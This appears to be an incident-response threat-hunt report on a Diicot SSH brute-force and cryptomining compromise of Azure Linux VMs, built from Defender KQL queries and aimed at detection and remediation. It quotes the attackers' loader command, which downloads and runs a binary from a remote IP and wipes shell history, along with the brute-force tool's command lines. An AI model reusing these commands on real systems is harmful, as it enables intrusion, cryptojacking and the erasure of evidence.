# Initial Threat Hunt: Azure SSH Brute-Force (Manual Analysis via MDE Advanced Hunting)

## 1. Objective

To identify, analyze, and document SSH brute-force activity targeting virtual machines (VMs) within a Microsoft Azure tenant. This phase focuses on **manual threat hunting** using Microsoft Defender for Endpoint (MDE)’s Advanced Hunting capabilities, rather than relying on MDE's automated Incidents Dashboard. This decision was made to showcase practical investigation and hunting techniques as part of a full-cycle post-incident analysis.

---

## 2. Scope

- **Environment**: Microsoft Azure tenant  
- **Timeframe**: March 14, 2025 – April 3, 2025  
- **Tools Used**:
  - Microsoft Defender for Endpoint (Advanced Hunting)
  - VirusTotal
  - ChatGPT (for log interpretation)

- **Access Constraints**:
  - Only VMs personally deployed by the analyst were accessible
  - Isolation of other users' devices was not permitted due to tenant policy
  - Log data was limited by an automated process that deleted entries older than 30 days, preventing effective root-cause analysis

> This investigation is conducted in two phases:  
> **Phase 1 (this file)**: Manual log-based hunting  
> **Phase 2**: Review of MDE’s Incidents Dashboard (see [`mde-dashboard-review.md`](./mde-dashboard-review.md))


---

## 3. Methodology

Analysis was initiated based on a Microsoft security alert indicating SSH brute-force behavior from internal IP `20.81.228.191`. Manual threat hunting was performed using KQL queries across multiple schemas in MDE:

- `DeviceInfo` to identify systems
- `DeviceProcessEvents`, `DeviceFileEvents`, and `DeviceNetworkEvents` to trace behavior
- VirusTotal to evaluate the notoriety of files and addresses
- MITRE ATT&CK used for TTP classification (shown in [`mitre-attack-mapping.md`](./mitre-attack-mapping.md))

---

## 4. Findings

### Finding #1 — Source Device

**Indicator:**  
`20.81.228.191` (Internal IP flagged in Microsoft security notice)

**Associated Device:**  
`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

**Timeframe:**  
`March 14, 2025 @ 12:41 UTC` → `March 18, 2025 @ 02:24 UTC`

**Behavior Observed:**  
- Brute-force behavior sourced from a single internal device  
- IP-to-device attribution confirmed via `DeviceInfo` schema  
- Over **99,000** SSH connection events observed in a short timeframe (March 14)  

**Query Used:**  
```kql
DeviceInfo
| where PublicIP == "20.81.228.191"
| order by Timestamp asc
```
<p align="center">
  <img src="https://github.com/user-attachments/assets/aafcf2c0-6ad0-4ca2-9730-43bfe2de3944" alt="Screenshot description" width="600"/>
</p>
<p align="center">
  <img src="https://github.com/user-attachments/assets/135723e8-64fb-47cf-85ce-a980ac502f4e" alt="Screenshot description" width="600"/>
</p>

**Query Used - March 14 Events:**
```kql
//Filtering out normal processes
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where Timestamp between (datetime(2025-03-14T16:41:22.631607Z) .. datetime(2025-03-14T20:46:16.607719Z))
| where InitiatingProcessCommandLine !contains "nessus" and InitiatingProcessCommandLine !contains "/var/lib/waagent/"
and InitiatingProcessCommandLine !contains "tenable"
| summarize CommandOccurrence = count() by InitiatingProcessCommandLine, ActionType
| order by CommandOccurrence desc
```
<p align="center">
  <img src="https://github.com/user-attachments/assets/754928b6-e72a-4f57-84e3-b083f27333fa" alt="Screenshot description" width="800"/>
</p>

---

**The following findings present an investigation into the most significant `InitiatingProcessCommandLine` events related to the SSH brute-force activity.
Each record has been analyzed for its role in supporting or executing the attack.**

---

### Finding #2 — Execution of `.bisis` SSH Brute-Force Binary

**Command Executed:**
```bash
/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
```
[View full command → `observed-commands.md`](./observed-commands.md#bisis-ssh-brute-force-command)

**Associated Device:**  
`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

**Timeframe:**  
`March 14, 2025 @ 16:41 UTC` and `March 17, 2025 @ 12:36 UTC`

**Details:**  
- `.bisis` is a hidden executable located in a non-standard path: `/var/tmp/.update-logs/`  
- Executes SSH attempts using a configuration file (`data.json`)  
- Responsible for 97,318 SSH attempts on March 14 and 85,152 more on March 17  
- 8-second timeout suggests aggressive brute-forcing or scanning  
- Repeatedly executed from the same source device across multiple sessions

**March 14th Activity:**
<p align="left">
  <img src="https://github.com/user-attachments/assets/e9f0ab77-0292-4613-bbe3-2a41a6ccaf34" alt="Screenshot description" width="770"/>
</p>

**March 17th Activity:**
<p align="left">
  <img src="https://github.com/user-attachments/assets/280d4db6-c6a9-4808-a134-65ce13b99b89" alt="Screenshot description" width="770"/>
</p>

**VirusTotal Score (.bisis):** `6/64`  

**Mapped MITRE Techniques:**  
- `T1110.001` — Brute Force: Password Guessing  
- `T1059` — Command and Scripting Interpreter

**Note:** *Brute-force activity began on March 14, but MDE only flagged it after the March 17 activity.*

---

**During the review of additional records associated with `update-logs`, the same `bisis` file reappears in this instance.
Analysis of the linked process tree revealed a sequence of commands executed leading to the launch of the `bisis` script**

---

### Finding #3 — Brute-Force Implementation of `.bisis` with Subsequent Payload

**Command Observed:**
```bash
bash -c "cd /var/tmp/.update-logs ; chmod +x /var/tmp/.update-logs/.bisis ; ulimit -n 999999 ; cat iplist | ./bisis... ; ./x"
```
[View full command → `observed-commands.md`](./observed-commands.md#bisis-repeated-execution-command)

**Associated Device:**  
`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

**Time Detected:**  
`March 14, 2025 @ 18:48 UTC`

**Details**
- Activity occurs from a hidden directory:`/var/tmp/.update-logs`, featuring obfuscated file names
- System limits via `ulimit` increased to support mass connection attempts  
- Executes `.bisis` with SSH brute-force parameters using high thread and timeout values
- Targets IPs listed in `iplist` and `iplist2`, attempting to brute-force the `root` user over port 22
- After brute-force phase, secondary binary `./x` is launched

<p align="center">
  <img src="https://github.com/user-attachments/assets/0ad63c32-9742-4013-822b-fe89b1c1f27e" alt="Process execution of .bisis and x" width="300"/>
  <img src="https://github.com/user-attachments/assets/1c5b83cd-5b2f-4985-bb88-2cf3fe6370fc" alt="Process execution of .bisis and x" width="300"/>
</p>

**Note:** *The observed `bash` command was executed via the `Update` file, as shown in the screenshots above.*

**VirusTotal Score (.bisis):** `6/64` 

**Mapped MITRE Techniques:**  
- `T1027` — Obfuscated Files or Information  
- `T1036` — Masquerading

---

**The following results were idenitifed through an additional query of the `update-logs` directory**

---

### Finding #4 — Malicious File Generated in `/var/tmp/`

**Indicators:**  
Files: `.b`, `.bisis`, `History`, `Update`, `x` and `UpzBUBnv`

**Associated Device:**  
`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

**Timeframe:**  
`March 14, 2025 @ 18:46 UTC` → `March 14, 2025 @ 21:29 UTC`

**Details:**  
- `UpzBUBnv` appears as a notable process in the `InitiatingProcessCommandLine` column of the query results
- No suspicious files were identified prior to the creation of `UpzBUBnv`, suggesting it as the first indicator of malicious activity
- Subsequent malicious files appear to have been introduced following the execution of `UpzBUBnv`
- `.bisis` was observed along with `x`, `.b`, `Update`, and `History`

**Query Used:**  
```kql
DeviceFileEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where Timestamp between (datetime(2025-03-14T16:41:22.631607Z) .. datetime(2025-03-14T20:46:16.607719Z))
| where FolderPath contains "update-logs"
| project Timestamp, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFolderPath, InitiatingProcessCommandLine
```  

**Note:** *`InitiatingProcessCommandLine output` on `Update` record shows a process called `UpzBUBnv`.*

<p align="left">
  <img src="https://github.com/user-attachments/assets/b494bfc8-e572-497f-9cad-8cf0c7fbae4d" alt="Screenshot description" width="900"/>
</p>

**Query Used:**  
```kql
// The same query was also run against the DeviceProcessEvents table
DeviceFileEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where Timestamp between (datetime(2025-03-14T16:41:22.631607Z) .. datetime(2025-03-14T20:46:16.607719Z))
| where FileName == "UpzBUBnv"
```  

**Note:** *Remote SSH connection was established, and the file `UpzBUBnv` was transferred to `/var/tmp/` using SCP.*  

<p align="center">
  <img src="https://github.com/user-attachments/assets/63985440-ea64-4e9e-9176-cecd1337d03b" alt="UpzBUBnv" width="300"/>
  <img src="https://github.com/user-attachments/assets/38fbc0ce-d133-4195-b571-214dcf51dfec" alt="UpzBUBnv" width="300"/>
</p>
<p align="center">
  DeviceProcessEvents Output
  <img src="https://github.com/user-attachments/assets/e6d0ad88-8eb3-4e49-befd-e82c930a046b" alt="UpzBUBnv" width="900"/>
</p>



**VirusTotal Scores:**
- `.bisis`: `6/64`  
- `.b`: N/A 
- `x`: N/A   
- `Update`: N/A   
- `History`: N/A  
- `UpzBUBnv`: N/A  

**Mapped MITRE Techniques:**  
- `T1059.004` — Command and Scripting Interpreter: Unix Shell  
- `T1036` — Masquerading

---

### Finding #5 — Deployment of Diicot Cryptominer via `./network` Loader

**Note:** *This command was observed in the March 14 `ConnectionRequests` query.*

**Command Observed:**
```bash
./network "rm -rf /var/tmp/Documents ; 
mkdir /var/tmp/Documents 2>&1 ; 
crontab -r ; 
chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; 
cd /var/tmp ; 
chattr -iae /var/tmp/Documents/.diicot ; 
pkill Opera ; pkill cnrig ; pkill java ; killall java ; 
pkill xmrig ; killall cnrig ; killall xmrig ; 
cd /var/tmp/ ; 
mv /var/tmp/diicot /var/tmp/Documents/.diicot ; 
mv /var/tmp/kuak /var/tmp/Documents/kuak ; 
cd /var/tmp/Documents ; 
chmod +x .* ; 
/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; 
history -c ; 
rm -rf .bash_history ~/.bash_history ; 
rm -rf /tmp/cache ; 
cd /tmp/ ; 
wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; 
mv .balu cache ; 
chmod +x cache ;
./cache >/dev/null 2>&1 & disown ; 
history -c ; 
rm -rf .bash_history ~/.bash_history"
```

**Associated Device:**  
`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

**Time Detected:**  
`March 14, 2025 @ 18:46 UTC`

**Details:**
- `./network` functions as a loader and cleanup script
- Deletes and recreates `/var/tmp/Documents` as a setup area
- Kills competitive miner processes: `xmrig`, `cnrig`, `Opera`, and `java`
- Moves `diicot` and `kuak` to staging directory, and executes `.diicot`
- Downloads `.balu` from remote IP `85.31.47.99`, renames file to `cache` and runs it 
- Modifies SSH configs and uses obfuscated paths to avoid detection
- Clears shell and bash history to erase evidence

**Note:** *DIICOT is a Romanian cybercriminal group known for targeting Linux systems using SSH brute-force attacks, gaining unauthorized 
access to deploy malware for cryptomining—reflective of the activity identified during this investigation.*

**Queries Used:**
```kql
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where Timestamp between (datetime(2025-03-14T16:41:22.631607Z) .. datetime(2025-03-14T20:46:16.607719Z))
| where InitiatingProcessCommandLine contains "./network"
| where ActionType == "ConnectionRequest"
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, InitiatingProcessCommandLine
```

**Note:** *Presence of `diicot`, `kuak`, and `cache` in `InitiatingProcessCommandLine` prompted deeper investigation of the `./network` loader's execution.*

<p align="center">
  <img src="https://github.com/user-attachments/assets/01004535-b8d4-4c0d-bda5-b4e83b2d8620" alt="./network" width="800"/>
</p>

```kql
let Files = dynamic(["diicot", "kuak", "cache"]);
DeviceFileEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where Timestamp between (datetime(2025-03-14T16:41:22.631607Z) .. datetime(2025-03-14T20:46:16.607719Z))
| where FileName has_any(Files)
```  

**Note:** *Two process trees were observed — one for `diicot` (top-right) and one for `kuak` (bottom). An unfamiliar `./retea` command also appears and will be examined next.*

<p align="center">
  <img src="https://github.com/user-attachments/assets/50b894e5-8d5d-4613-a153-271be77ab166" alt="./network" width="600"/>
  <img src="https://github.com/user-attachments/assets/2a0cd76e-78c4-4f13-aaa5-11b2325b242b" alt="UpzBUBnv" width="320"/>
  <img src="https://github.com/user-attachments/assets/72410e77-c048-4aa6-8df0-ebfa109db5e9" alt="./network" width="275"/>
  <img src="https://github.com/user-attachments/assets/ea24de2f-0e57-4327-8bef-ffd34af025f8" alt="UpzBUBnv" width="250"/>
</p>

**VirusTotal Scores:**  
- `.diicot`: `21/64`
- `kuak`: `30/64`
- `.balu` (renamed to `cache`): `33/64`
- `85.31.47.99`: `1/94`

**Mapped MITRE Techniques:**  
- `T1059` — Command and Scripting Interpreter  
- `T1070.004` — Indicator Removal: File Deletion  
- `T1036` — Masquerading  
- `T1564.001` — Hidden Files and Directories

---

### Finding #6 — Execution of `./retea` Script for Credential Harvesting and Payload Launch

**Command Observed:**
```bash
./retea -c 'key=$1; user=$2; if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]];... Haceru'
```
[View full command → `observed-commands.md`](./observed-commands.md#bisis-repeated-execution-command)

**Associated Device:**  
`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

**Timeframe:**  
`March 14, 2025 @ 18:46 UTC`

**Behavior Observed:**  
- Terminates known miner processes to stop existing cryptomining activity (e.g., xmrig, cnrig, Opera)
- Disables scehduled tasks and removes SSH authorized keys and command history
- Downloads and silently executes a remote payload (`payload`) from `dinpasiune.com`
- Executes second hidden binary `.teaca`, subsequently clearing logs
- Alters system limits (`ulimit`, `/etc/sysctl.conf`) and prepares `/dev/shm` for staging and persistence
- Credential harvesting done by enumerating local users and generating a large password dictionary (`pass`) using common variations
- `./network` loader script is executed, as detailed in the previous finding
- Performs a final round of log and history deletion

```kql
let Files = dynamic(["diicot", "kuak", "cache"]);
DeviceFileEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where Timestamp between (datetime(2025-03-14T16:41:22.631607Z) .. datetime(2025-03-14T20:46:16.607719Z))
| where FileName has_any(Files)
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/034f2a65-993e-4f4f-88c8-35306e0649df" alt="./network" width="375"/>
</p>

**Note:** *The `./retea` script was identified during deeper investigation into the origin of the `./network` loader's execution.*

**VirusTotal Scores:**  
- `payload` (from dinpasiune.com): `43/64` 
- `retea`: `38/64`
- `dinpasiune.com`: `16/94`
- `85.31.47.99`: `1/94`

**Mapped MITRE Techniques:**  
- `T1110.001` — Brute Force: Password Guessing  
- `T1059` — Command and Scripting Interpreter  
- `T1036` — Masquerading  
- `T1070.004` — Indicator Removal on Host: File Deletion

---

### Finding #7 — Outbound SSH Connections via `.bisis` and `Update` Binaries

**Command Observed:**
```bash
/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
```
```bash
/var/tmp/.update-logs/Update -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
```
[View full commands → `observed-commands.md`](./observed-commands.md#ssh-brute-force-commands)

**Associated Device:**  
`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`

**Time Detected:**  
`March 14, 2025 @ 18:49 → 19:22 UTC`  
`March 14, 2025 @ 19:23 → 19:25 UTC`   
`March 17, 2025 @ 15:49 UTC`


**Behavior Observed:**  
- High-volume outbound SSH connections were initiated using two different binaries: `.bisis` and `Update`  
- All connections were unauthenticated brute-force attempts over port 22 with short timeouts  
- These were **confirmed successful connection requests** to a range of external IPs

### `March 14, 2025 @ 18:49` – `19:22 UTC` — `.bisis` Connections

**Confirmed Outbound IPs:**
- `140.186.43.104`, `140.186.248.106`, `140.186.59.95`, `140.186.205.38`, `140.186.253.5`
- `175.201.2.110`, `175.201.47.187`, `175.201.82.226`, `175.201.109.213`, `175.201.116.12`, `175.201.131.118`, `175.201.167.35`, `175.201.181.162`, `175.201.239.38`
- `45.64.124.130`, `45.64.129.246`, `45.64.185.5`
- `137.204.40.210`, `137.204.139.202`, `137.204.162.100`, `137.204.215.215`, `137.204.227.143`, `137.204.229.148`

**Query Used to Observe Successful Connections:**
```kql
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where Timestamp between (datetime(2025-03-14T16:41:22.631607Z) .. datetime(2025-03-14T20:46:16.607719Z))
| where InitiatingProcessCommandLine !contains "nessus" and InitiatingProcessCommandLine !contains "/var/lib/waagent/"
and InitiatingProcessCommandLine !contains "tenable"
| where InitiatingProcessCommandLine == “/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8"
| where ActionType == "ConnectionSuccess"
| project Timestamp, DeviceName, ActionType, RemoteIP, InitiatingProcessCommandLine
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/f11353a2-f4b0-4809-a79c-df2d0f530123" alt="./network" width="1000"/>
</p>

### `March 17, 2025 @ 15:49 UTC` — `.bisis` Additional Connection

**Confirmed Outbound IP:**
- `213.217.173.134`

**Query Used:**
```kql
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where Timestamp between (datetime(2025-03-17T15:20:22.3017084Z) .. datetime(2025-03-18T03:16:33.8086809Z))
| where InitiatingProcessCommandLine !contains "nessus" and InitiatingProcessCommandLine !contains "/var/lib/waagent/"
and InitiatingProcessCommandLine !contains "tenable"
| where ActionType == "ConnectionSuccess"
| project Timestamp, DeviceName, ActionType, RemoteIP, InitiatingProcessCommandLine
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/ef2795dc-2732-4e0a-a8fa-6ad846eb59a8" alt="./network" width="1000"/>
</p>

---

### `March 14, 2025 @ 19:23` – `19:25 UTC` — `Update` Connections

**Confirmed Outbound IPs:**
- `45.64.52.3`
- `45.64.237.36`
- `45.64.248.22`
- `45.64.128.181`

**Query Used:**
```kql
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where Timestamp between (datetime(2025-03-14T16:41:22.631607Z) .. datetime(2025-03-14T20:46:16.607719Z))
| where InitiatingProcessCommandLine !contains "nessus" and InitiatingProcessCommandLine !contains "/var/lib/waagent/"
and InitiatingProcessCommandLine !contains "tenable"
| where InitiatingProcessCommandLine == "/var/tmp/.update-logs/Update"
| where ActionType == "ConnectionSuccess"
| project Timestamp, DeviceName, ActionType, RemoteIP, InitiatingProcessCommandLine
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/935e4433-7260-4a0a-8522-e9c3b0a6f050" alt="./network" width="800"/>
</p>

**Details:**  
- Both binaries were used from the same directory and share identical behavior patterns  
- All IPs targeted are public and routable, indicating external brute-force attempts  
- The split usage suggests either a fallback mechanism or stealth evasion via renaming  
- **No connections to internal Azure tenant IPs** were observed in this phase  
- This activity represents the scanning and propagation phase of the attack prior to payload deployment

**VirusTotal Score (Binary References):**  
- `.bisis`: `31/64`  
- `Update`: `30/64`

**Mapped MITRE Techniques:**  
- `T1021.004` — Remote Services: SSH  
- `T1110` — Brute Force  
- `T1036` — Masquerading

---

### Finding #8 — Multi-Host Deployment of `.bisis` SSH Brute-Force Tool

**Command Observed:**
```
/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
```
[View full command → `observed-commands.md`](./observed-commands.md#ssh-brute-force-commands)

**Associated Devices (First Observed):**
- `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net` — March 14, 2025
- `sakel-lunix-2` — March 16, 2025
- `jr-linux-vm-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net` — March 24, 2025
- `linux-vulnerability-test-dylan.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net` — March 29, 2025
- `linuxvmcraig.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net` — April 3, 2025

**Timeframe:**  
`March 14, 2025 @ 12:41 UTC` → `April 3, 2025 @ 6:10 AM EST`

**Behavior Observed:**  
- The `.bisis` SSH brute-force command appeared across five different Linux VMs in the Azure tenant over three weeks.
- All hosts executed the same `.bisis` binary with similar parameters, suggesting lateral spread or manual attacker reuse.
- Notable successful outbound SSH connection attempts were observed from `jr-linux-vm-test` and `sakel-lunix-2`.

**Details:**
- `jr-linux-vm-test` successfully connected to multiple IPs:
  - `123.116.65.221`
  - `123.116.78.224`
  - `121.134.230.136`
  - `80.179.162.216`
  - `80.179.218.146`
  - `111.113.54.162`
- `sakel-lunix-2` made a successful outbound connection to:
  - `42.121.86.211`

**Query Used — Cross-Device `.bisis` Presence:**
```
DeviceNetworkEvents
| where Timestamp > ago(100d)
| where InitiatingProcessCommandLine !contains "nessus"
  and InitiatingProcessCommandLine !contains "/var/lib/waagent/"
  and InitiatingProcessCommandLine !contains "tenable"
| where InitiatingProcessCommandLine == "/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), CommandOccurrence=count() by DeviceName
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/43815a9c-1013-4b10-a46b-05293644eb87" alt="./network" width="1000"/>
</p>

**Query Used — `jr-linux-vm-test` Successes:**
```
DeviceNetworkEvents
| where DeviceName == "jr-linux-vm-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where InitiatingProcessCommandLine !contains "nessus"
  and InitiatingProcessCommandLine !contains "/var/lib/waagent/"
  and InitiatingProcessCommandLine !contains "tenable"
| where InitiatingProcessCommandLine == "/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8"
| where ActionType == "ConnectionSuccess"
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/747e33c1-d59f-419a-a866-76c83a44bbdd" alt="./network" width="800"/>
</p>

**Query Used — `sakel-lunix-2` Success:**
```
DeviceNetworkEvents
| where DeviceName == "sakel-lunix-2"
| where InitiatingProcessCommandLine == "/var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8"
| where ActionType == "ConnectionSuccess"
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/e8fd8fc6-7fbd-453e-8c55-05c9ec08f698" alt="./network" width="800"/>
</p>

**Mapped MITRE Techniques:**  
- `T1021.004` — Remote Services: SSH  
- `T1110` — Brute Force  
- `T1078` — Valid Accounts  
- `T1036` — Masquerading

---

## 5. Conclusion

An in-depth analysis of outbound SSH traffic from the Azure tenant revealed that several Linux-based virtual machines had been compromised and were actively participating in coordinated malicious activity attributed to the Romanian threat actor group Diicot. The investigation was initiated following an abuse notice from Microsoft, which identified brute-force activity originating from the IP address `20.81.228.191`. Subsequent telemetry correlation using Microsoft Defender for Endpoint and KQL-based querying identified the device `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net` as the source of the activity.

During the observed attack window, the device executed a series of obfuscated scripts—`.bisis`, `Update`, `cache`, and `retea`—from concealed directories, primarily under `/var/tmp/.update-logs`. These scripts initiated over **180,000** SSH connection attempts, established multiple successful connections, and deployed persistence mechanisms through scheduled cron jobs. Forensic review uncovered additional binaries—`diicot` and `kuak`—commonly linked to **Diicot's** known cryptojacking campaigns. These binaries were involved in executing malicious payloads, mining cryptocurrency, and facilitating internal lateral movement to expand control over additional systems.

VirusTotal analysis and process tree reviews confirmed the malicious nature of these components, with high detection scores and clear behavioral alignment with Diicot’s documented toolset. The compromise spanned five virtual machines and persisted over a three-week period, from March 14 to April 3, 2025. Indicators of compromise included unauthorized SSH access attempts, payload delivery from suspicious external servers, and stealth mechanisms designed to evade detection and maintain long-term access. The campaign illustrates a well-structured, multi-stage intrusion with confirmed attribution to a sophisticated threat group operating with clear intent and persistence across the environment.

While the brute-force attempts appear to have stopped, further validation is required to ensure no remaining persistence exists.

The next section investigates what Microsoft Defender for Endpoint's **Incidents Dashboard** detected automatically — and where gaps in detection may exist.

---

## 6. Recommendations

- **Rebuild All Affected Hosts**: Any system observed to have executed `.bisis`, `./network`, or similar binaries should be considered compromised and fully rebuilt.  
- **Implement SSH Rate Limiting and MFA**: Enforce `fail2ban` or similar rate-limiting tools on all Linux VMs and require multi-factor authentication where possible.  
- **Block Malicious Domains/IPs**: Add known indicators such as `85.31.47.99`, `dinpasiune.com`, and any VirusTotal-flagged infrastructure to your firewall blocklists.  
- **Harden VM Baseline Configurations**: Disable password-based SSH authentication and only allow certificate-based logins using updated authorized keys.  
- **Review Audit Policies and Logging Retention**: Extend log retention windows and configure auditd or sysmon-like tools for deeper visibility into system-level events.  
- **Conduct Tenant-Wide Threat Hunts**: Repeat similar queries across all accessible devices in the Azure tenant to identify any additional signs of compromise.  
- **Report Indicators to Microsoft Security**: Submit indicators and findings to Microsoft’s Security Response Center for review and possible enforcement or intelligence enrichment.  

<!--
Avoid filler or speculation unless flagged (e.g., “likely persistence mechanism”).
Make sure the screenshots have context above it (if its missing or you dont know what to have then have it empty so i can fill in the context)
A **high-level conclusion** tying all findings together
-->



